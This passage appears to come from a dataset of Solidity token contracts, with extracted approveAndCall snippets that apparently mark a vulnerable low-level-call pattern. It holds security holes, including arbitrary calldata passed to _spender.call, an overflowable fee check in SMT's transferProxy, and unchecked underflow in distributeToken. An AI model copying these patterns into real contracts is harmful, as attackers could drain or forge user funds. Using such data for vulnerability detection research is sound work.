  "content": "pragma solidity ^0.4.15;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) public constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n function approve(address _spender, uint256 _value) public returns (bool success);\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract Owned {\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n address public owner;\n function Owned() public {\n owner = msg.sender;\n }\n address newOwner=0x0;\n event OwnerUpdate(address _prevOwner, address _newOwner);\n function changeOwner(address _newOwner) public onlyOwner {\n require(_newOwner != owner);\n newOwner = _newOwner;\n }\n function acceptOwnership() public{\n require(msg.sender == newOwner);\n OwnerUpdate(owner, newOwner);\n owner = newOwner;\n newOwner = 0x0;\n }\n}\ncontract Controlled is Owned{\n function Controlled() public {\n setExclude(msg.sender);\n }\n bool public transferEnabled = false;\n bool lockFlag=true;\n mapping(address => bool) locked;\n mapping(address => bool) exclude;\n function enableTransfer(bool _enable) public onlyOwner{\n transferEnabled=_enable;\n }\n function disableLock(bool _enable) public onlyOwner returns (bool success){\n lockFlag=_enable;\n return true;\n }\n function addLock(address _addr) public onlyOwner returns (bool success){\n require(_addr!=msg.sender);\n locked[_addr]=true;\n return true;\n }\n function setExclude(address _addr) public onlyOwner returns (bool success){\n exclude[_addr]=true;\n return true;\n }\n function removeLock(address _addr) public onlyOwner returns (bool success){\n locked[_addr]=false;\n return true;\n }\n modifier transferAllowed(address _addr) {\n if (!exclude[_addr]) {\n assert(transferEnabled);\n if(lockFlag){\n assert(!locked[_addr]);\n }\n }\n _;\n }\n}\ncontract StandardToken is Token,Controlled {\n function transfer(address _to, uint256 _value) public transferAllowed(msg.sender) returns (bool success) {\n if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) public transferAllowed(_from) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) public constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract SMT is StandardToken {\n function () public {\n revert();\n }\n string public name = \"SmartMesh Token\";\n uint8 public decimals = 18;\n string public symbol = \"SMT\";\n string public version = 'v0.1';\n uint256 public allocateEndTime;\n mapping(address => uint256) nonces;\n function SMT() public {\n allocateEndTime = now + 1 days;\n }\n function transferProxy(address _from, address _to, uint256 _value, uint256 _feeSmt,\n uint8 _v,bytes32 _r, bytes32 _s) public transferAllowed(_from) returns (bool){\n if(balances[_from] < _feeSmt + _value) revert();\n uint256 nonce = nonces[_from];\n bytes32 h = keccak256(_from,_to,_value,_feeSmt,nonce);\n if(_from != ecrecover(h,_v,_r,_s)) revert();\n if(balances[_to] + _value < balances[_to]\n || balances[msg.sender] + _feeSmt < balances[msg.sender]) revert();\n balances[_to] += _value;\n Transfer(_from, _to, _value);\n balances[msg.sender] += _feeSmt;\n Transfer(_from, msg.sender, _feeSmt);\n balances[_from] -= _value + _feeSmt;\n nonces[_from] = nonce + 1;\n return true;\n }\n function approveProxy(address _from, address _spender, uint256 _value,\n uint8 _v,bytes32 _r, bytes32 _s) public returns (bool success) {\n uint256 nonce = nonces[_from];\n bytes32 hash = keccak256(_from,_spender,_value,nonce);\n if(_from != ecrecover(hash,_v,_r,_s)) revert();\n allowed[_from][_spender] = _value;\n Approval(_from, _spender, _value);\n nonces[_from] = nonce + 1;\n return true;\n }\n function getNonce(address _addr) public constant returns (uint256){\n return nonces[_addr];\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\n return true;\n }\n function approveAndCallcode(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(_extraData)) { revert(); }\n return true;\n }\n function allocateTokens(address[] _owners, uint256[] _values) public onlyOwner {\n if(allocateEndTime < now) revert();\n if(_owners.length != _values.length) revert();\n for(uint256 i = 0; i < _owners.length ; i++){\n address to = _owners[i];\n uint256 value = _values[i];\n if(totalSupply + value <= totalSupply || balances[to] + value <= balances[to]) revert();\n totalSupply += value;\n balances[to] += value;\n }\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\nreturn true;\n}",
    "function approveAndCallcode(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(_extraData)) { revert(); }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb164d"
  },
  "filename": "43422.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function distributeToken(address[] addresses, uint256 _value) {\n for (uint i = 0; i < addresses.length; i++) {\n balances[msg.sender] -= _value;\n balances[addresses[i]] += _value;\n Transfer(msg.sender, addresses[i], _value);\n }\n}\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n totalSupply = 12 * 10 ** 24;\n balances[msg.sender] = totalSupply;\n name = \"EETHER\";\n decimals = 18;\n symbol = \"EETHER\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb164e"
  },
  "filename": "43465.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract HashnodeTestCoin is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n uint256 public unitsOneEthCanBuy;\n uint256 public totalEthInWei;\n address public fundsWallet;\n function HashnodeTestCoin() {\n balances[msg.sender] = 100000000000000000000000000;\n totalSupply = 100000000000000000000000000;\n name = \"Easy Trading Token\";\n decimals = 18;\n symbol = \"ETT\";\n unitsOneEthCanBuy = 40000;\n fundsWallet = msg.sender;\n }\n function() payable{\n totalEthInWei = totalEthInWei + msg.value;\n uint256 amount = msg.value * unitsOneEthCanBuy;\n require(balances[fundsWallet] >= amount);\n balances[fundsWallet] = balances[fundsWallet] - amount;\n balances[msg.sender] = balances[msg.sender] + amount;\n Transfer(fundsWallet, msg.sender, amount);\n fundsWallet.transfer(msg.value);\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb164f"
  },
  "filename": "43473.sol",
  "content": "pragma solidity ^0.4.8;\ncontract Token{\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns\n (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns\n (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256\n _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) returns\n (bool success) {\n require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success)\n {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract HumanStandardToken is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(uint256 _initialAmount, string _tokenName, uint8 _decimalUnits, string _tokenSymbol) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb1650"
  },
  "filename": "43502.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract CoinTroops is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function CoinTroops(\n ) {\n balances[msg.sender] = 500000000000000;\n totalSupply = 500000000000000;\n name = \"Coin Troops\";\n decimals = 6;\n symbol = \"CTP\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb1651"
  },
  "filename": "43556.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract Bittelux is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n uint256 public unitsOneEthCanBuy;\n uint256 public totalEthInWei;\n address public fundsWallet;\n function Bittelux() {\n balances[msg.sender] = 10000000000000000000000000000;\n totalSupply = 10000000000000000000000000000;\n name = \"Bittelux\";\n decimals = 18;\n symbol = \"BTX\";\n unitsOneEthCanBuy = 22500;\n fundsWallet = msg.sender;\n }\n function() payable{\n totalEthInWei = totalEthInWei + msg.value;\n uint256 amount = msg.value * unitsOneEthCanBuy;\n require(balances[fundsWallet] >= amount);\n balances[fundsWallet] = balances[fundsWallet] - amount;\n balances[msg.sender] = balances[msg.sender] + amount;\n Transfer(fundsWallet, msg.sender, amount);\n fundsWallet.transfer(msg.value);\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb1652"
  },
  "filename": "43557.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ChuCunLingAIGO is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function ChuCunLingAIGO(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb1653"
  },
  "filename": "43585.sol",
  "content": "pragma solidity ^0.4.16;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract CAST is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function CAST(\n ) {\n balances[msg.sender] = 75000000 * 100000000;\n totalSupply = 75000000 * 100000000;\n name = \"Crypto Alley Shares\";\n decimals = 8;\n symbol = \"CAST\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb1654"
  },
  "filename": "43746.sol",
  "content": "pragma solidity ^0.4.15;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal constant returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract AbstractPaymentEscrow is Ownable {\n address public wallet;\n mapping (uint => uint) public deposits;\n event Payment(address indexed _customer, uint indexed _projectId, uint value);\n event Withdraw(address indexed _wallet, uint value);\n function withdrawFunds() public;\n function changeWallet(address _wallet)\n public\n onlyOwner()\n {\n wallet = _wallet;\n }\n function getDeposit(uint _projectId)\n public\n constant\n returns (uint)\n {\n return deposits[_projectId];\n }\n}\ncontract TokitRegistry is Ownable {\n struct ProjectContracts {\n address token;\n address fund;\n address campaign;\n }\n mapping (address => bool) public registrars;\n mapping (address => mapping(uint => ProjectContracts)) public registry;\n mapping (uint => ProjectContracts) public project_registry;\n event RegisteredToken(address indexed _projectOwner, uint indexed _projectId, address _token, address _fund);\n event RegisteredCampaign(address indexed _projectOwner, uint indexed _projectId, address _campaign);\n modifier onlyRegistrars() {\n require(registrars[msg.sender]);\n _;\n }\n function TokitRegistry(address _owner) {\n setRegistrar(_owner, true);\n transferOwnership(_owner);\n }\n function register(address _customer, uint _projectId, address _token, address _fund)\n onlyRegistrars()\n {\n registry[_customer][_projectId].token = _token;\n registry[_customer][_projectId].fund = _fund;\n project_registry[_projectId].token = _token;\n project_registry[_projectId].fund = _fund;\n RegisteredToken(_customer, _projectId, _token, _fund);\n }\n function register(address _customer, uint _projectId, address _campaign)\n onlyRegistrars()\n {\n registry[_customer][_projectId].campaign = _campaign;\n project_registry[_projectId].campaign = _campaign;\n RegisteredCampaign(_customer, _projectId, _campaign);\n }\n function lookup(address _customer, uint _projectId)\n constant\n returns (address token, address fund, address campaign)\n {\n return (\n registry[_customer][_projectId].token,\n registry[_customer][_projectId].fund,\n registry[_customer][_projectId].campaign\n );\n }\n function lookupByProject(uint _projectId)\n constant\n returns (address token, address fund, address campaign)\n {\n return (\n project_registry[_projectId].token,\n project_registry[_projectId].fund,\n project_registry[_projectId].campaign\n );\n }\n function setRegistrar(address _registrar, bool enabled)\n onlyOwner()\n {\n registrars[_registrar] = enabled;\n }\n}\ncontract SingularDTVFund {\n string public version = \"0.1.0\";\n AbstractSingularDTVToken public singularDTVToken;\n address public owner;\n uint public totalReward;\n mapping (address => uint) public rewardAtTimeOfWithdraw;\n mapping (address => uint) public owed;\n modifier onlyOwner() {\n if (msg.sender != owner) {\n revert();\n }\n _;\n }\n function depositReward()\n public\n payable\n returns (bool)\n {\n totalReward += msg.value;\n return true;\n }\n function calcReward(address forAddress) private returns (uint) {\n return singularDTVToken.balanceOf(forAddress) * (totalReward - rewardAtTimeOfWithdraw[forAddress]) / singularDTVToken.totalSupply();\n }\n function withdrawReward()\n public\n returns (uint)\n {\n uint value = calcReward(msg.sender) + owed[msg.sender];\n rewardAtTimeOfWithdraw[msg.sender] = totalReward;\n owed[msg.sender] = 0;\n if (value > 0 && !msg.sender.send(value)) {\n revert();\n }\n return value;\n }\n function softWithdrawRewardFor(address forAddress)\n external\n returns (uint)\n {\n uint value = calcReward(forAddress);\n rewardAtTimeOfWithdraw[forAddress] = totalReward;\n owed[forAddress] += value;\n return value;\n }\n function setup(address singularDTVTokenAddress)\n external\n onlyOwner\n returns (bool)\n {\n if (address(singularDTVToken) == 0) {\n singularDTVToken = AbstractSingularDTVToken(singularDTVTokenAddress);\n return true;\n }\n return false;\n 